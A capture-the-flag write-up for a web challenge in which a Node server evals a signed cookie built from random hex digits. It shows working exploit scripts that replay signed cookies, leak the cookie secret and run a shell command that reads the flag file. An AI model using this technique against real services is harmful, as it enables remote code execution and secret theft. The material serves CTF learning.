# Challenge

Hello, I am a Random Code Executor, I can execute r4Nd�M JavaScript code for you ><

Tips:
Have you ever heard of Infinite monkey theorem? If you click the "RCE!" button enough times you can get the flag 😉

rce-4bc5d3c73ac0fd8c0b098e9e7ac5a2e1c7a2fcf6.zip

Author: splitline

# Writeup

The challenge asks us to read the flag from file system. The core code part is:

```js
app.get('/random', function (req, res) {
    let result = null;
    if (req.signedCookies.code.length >= 40) {
        const code = Buffer.from(req.signedCookies.code, 'hex').toString();
        try {
            result = eval(code);
        } catch {
            result = '(execution error)';
        }
        res.cookie('code', '', { signed: true })
            .send({ progress: req.signedCookies.code.length, result: `Executing '${code}', result = ${result}` });
    } else {
        res.cookie('code', req.signedCookies.code + randomHex(), { signed: true })
            .send({ progress: req.signedCookies.code.length, result });
    }
});
```

It randomly appends one hex to the current code, and executes it if `length >= 40`. The cookie is signed so that we cannot fake one without the secret. Since we can control the cookies, we can use one cookie the generate multiple HTTP requests, and find the one we want. Prepare our code as hex, and compare the prefix of the code and the cookie in a loop. If a longer prefix is matched, we can proceed with the new cookie:

```python
s = requests.Session()
hostname = 'http://127.0.0.1:8000'
domain = '127.0.0.1'
r = s.get(f'{hostname}/')
print(r)

target = "some python code here"
target_hex = target.encode('utf-8').hex()

progress = 0
while progress < len(target_hex):
    current_cookie = s.cookies.get('code')
    current_hex = current_cookie[4:current_cookie.find('.')]

    r = s.get(f'{hostname}/random')
    print(r.text, s.cookies)
    if progress == 40:
	print(r.json())
        break
    new_cookie = s.cookies.get('code')
    new_hex = new_cookie[4:new_cookie.find('.')]
    if new_hex[progress] != target_hex[progress]:
        s.cookies.clear()
        s.cookies.set('code', current_cookie, domain=domain)
    else:
        progress += 1
```

However, we can only execute arbitrary Python code within 20 bytes(that is 40 bytes in hex). We did not find ways to read flag file within the limit, so we had to extract the cookie secret out and sign the code by ourselves.

Fortunately, the cookie secret can be access via `req.secret`. Thus, we can retrieve the cookie secret with the code above, and then sign our real code with the secret.

We wrote a script to sign the code with the secret:

```js
var cookie_parser = require('cookie-parser');
var cookie_signature = require('cookie-signature');
var code = process.argv[2];
var secret = process.argv[3];
var signed = 's:' + cookie_signature.sign(code, secret);
console.log(signed);
```

Then, we execute `req.secret` remotely to get the secret and capture the flag:

```python
target = "req.secret;;;;;;;;;;;;;;;;;;;"
# omitted
while progress < len(target_hex):
    # omitted
    if progress == 40:
        secret = r.json()['result']
        secret = secret.split(' ')[-1]
        break
    # omitted
print('secret', secret)

target2 = "require('child_process').execSync('cat /flag*')"
target2_hex = target2.encode('utf-8').hex()
signed = subprocess.check_output(["node", "sign.js", target2_hex, secret]).decode('utf-8').strip()
print(signed)
s.cookies.set('code', quote(signed), domain=domain)
print(s.cookies)
r = s.get(f'{hostname}/random')
print(r.text, s.cookies)
# => hitcon{random cat executionnnnnnn}
```

# Conclusion

`eval()` is evil. Cookie secret can be leaked via RCE.
